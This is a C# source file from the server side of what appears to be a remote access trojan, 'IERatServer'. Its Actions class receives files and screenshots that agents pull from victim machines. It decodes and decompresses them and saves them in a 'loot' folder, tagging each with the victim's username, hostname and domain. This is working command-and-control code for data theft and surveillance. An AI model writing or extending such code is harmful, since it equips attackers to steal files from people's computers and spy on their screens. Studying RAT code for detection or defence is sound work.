using System;
using System.IO;
using System.IO.Compression;

namespace IERatServer.lib
{
    class Actions
    {
        public static void HandleAdvancedTasks(RequestObject requestobject, TaskObject taskObject)
        {
            try
            {
                AgentChannel ActiveChannel = Db.GetChannelFromID(requestobject.AgentID);
                var agent = ActiveChannel.agent;
                if (taskObject.Type == "download")
                {
                    var Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}-{taskObject.args}";
                    var filepath = Path.Combine(CLI.LootFolder, Filename);
                    var destinationFile = File.Create(filepath);
                    var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
                    destinationFile.Write(fileBytes);

                    Console.WriteLine($"\nDownload was successfull to [{filepath}]\n");
                    Logger.Log("info", $"Download was successfull from agent {requestobject.AgentID} [{taskObject.args}]");
                    taskObject.Result = $"Successfully downloaded to {filepath}";
                }
                if (taskObject.Type == "screenshot")
                {
                    var Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}.jpg";
                    var filepath = Path.Combine(CLI.LootFolder, Filename);
                    var destinationFile = File.Create(filepath);
                    var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
                    destinationFile.Write(fileBytes);

                    Console.WriteLine($"\nScreenshot saved successfully to {filepath}\n");
                    Logger.Log("info", $"Screenshot was successfull saved from agent {requestobject.AgentID} to file {filepath}");
                    taskObject.Result = "Screenshot saved successfully";
                }

                Db.TaskHistory.Add(new TaskHistoryObject() {
                    AgentNumber = ActiveChannel.InteractNum,
                    AgentID = requestobject.AgentID,
                    task = taskObject });

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Logger.Log("error", ex.Message);
            }
        }

        public static byte[] Compress(byte[] data)
        {
            using var compressedStream = new MemoryStream();
            using var zipStream = new GZipStream(compressedStream, CompressionMode.Compress);
            zipStream.Write(data, 0, data.Length);
            zipStream.Close();
            return compressedStream.ToArray();
        }

        static byte[] Decompress(byte[] data)
        {
            using var compressedStream = new MemoryStream(data);
            using var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress);
            using var resultStream = new MemoryStream();
            zipStream.CopyTo(resultStream);
            return resultStream.ToArray();
        }
    }
}
